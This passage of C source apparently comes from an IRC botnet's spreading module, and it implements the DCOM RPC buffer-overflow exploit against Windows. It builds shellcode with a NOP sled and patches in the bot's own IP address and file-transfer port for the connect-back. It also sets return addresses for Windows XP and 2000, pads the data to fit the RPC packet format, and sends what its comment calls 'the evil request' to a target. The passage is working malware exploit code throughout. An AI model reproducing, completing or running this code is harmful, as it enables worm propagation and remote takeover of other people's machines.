			g_cMainCtrl.m_cBot.bot_ftrans_port.iValue, g_cMainCtrl.m_cIRC.m_lLocalAddr, \
			DCOM_SHELLCODE_OFFSET_PORT, DCOM_SHELLCODE_OFFSET_IP, NULL);
	
	// Build a buffer with the shellcode
	memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
	memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
	memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
	iSCSize=iPos; iPos=0;

	// Prepend NOPs as long as shellcode doesn't fit RPC packet format
	while(iSCSize%16!=12)
	{	char *szTemp=(char*)malloc(iSCSize+1); iNOPSize++;
		memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
		memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
		memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
		iSCSize=iPos; iPos=0; free(szTemp); }

	// Set the return address
	if(iHostOS==OS_WINXP)
		memcpy(szSCBuf+36, (char*)&my_offsets[1], 4);
	else
		memcpy(szSCBuf+36, (char*)&my_offsets[0], 4);

	// Build the request
	memcpy(szReqBuf+iPos,	request1,			sizeof(request1)-1			); iPos+=sizeof(request1)-1;
	memcpy(szReqBuf+iPos,	request2,			sizeof(request2)-1			); iPos+=sizeof(request2)-1;
	memcpy(szReqBuf+iPos,	szSCBuf,			iSCSize						); iPos+=iSCSize;
	memcpy(szReqBuf+iPos,	request3,			sizeof(request3)-1			); iPos+=sizeof(request3)-1;
	memcpy(szReqBuf+iPos,	request4,			sizeof(request4)-1			); iPos+=sizeof(request4)-1;
	iReqSize=iPos;

	pTemp=szReqBuf+sizeof(request1)-1; // Fill the request with the right sizes
	*(unsigned long*)(pTemp)		= *(unsigned long*)(pTemp)		+ iSCSize / 2;
	*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize / 2; pTemp=szReqBuf;
	*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize - 12;
	*(unsigned long*)(pTemp+16)		= *(unsigned long*)(pTemp+16)	+ iSCSize - 12;
	*(unsigned long*)(pTemp+128)	= *(unsigned long*)(pTemp+128)	+ iSCSize - 12;
	*(unsigned long*)(pTemp+132)	= *(unsigned long*)(pTemp+132)	+ iSCSize - 12;
	*(unsigned long*)(pTemp+180)	= *(unsigned long*)(pTemp+180)	+ iSCSize - 12;
	*(unsigned long*)(pTemp+184)	= *(unsigned long*)(pTemp+184)	+ iSCSize - 12;
	*(unsigned long*)(pTemp+208)	= *(unsigned long*)(pTemp+208)	+ iSCSize - 12;
	*(unsigned long*)(pTemp+396)	= *(unsigned long*)(pTemp+396)	+ iSCSize - 12;
	
	// Connect to the server
	int iErr=connect(sSocket, (sockaddr*)&ssin, sizeof(sockaddr_in));
	if(iErr==-1) // Connect failed, exit
	{	xClose(sSocket); return false; }
	// Send the bind string
	if(xWrite(sSocket, bindstr, sizeof(bindstr)-1)==SOCKET_ERROR) { xClose(sSocket); return false; }
	// Read reply
	xRead(sSocket, szRecvBuf, sizeof(szRecvBuf));
	// Send the evil request
	if(xWrite(sSocket, szReqBuf, iReqSize)==SOCKET_ERROR) { xClose(sSocket); return false; }
	// Read reply
	if(xRead(sSocket, szRecvBuf, sizeof(szRecvBuf))!=-1) { xClose(sSocket); return false; }

	// Close the socket that was once funky fresh
	xClose(sSocket); return true;
}

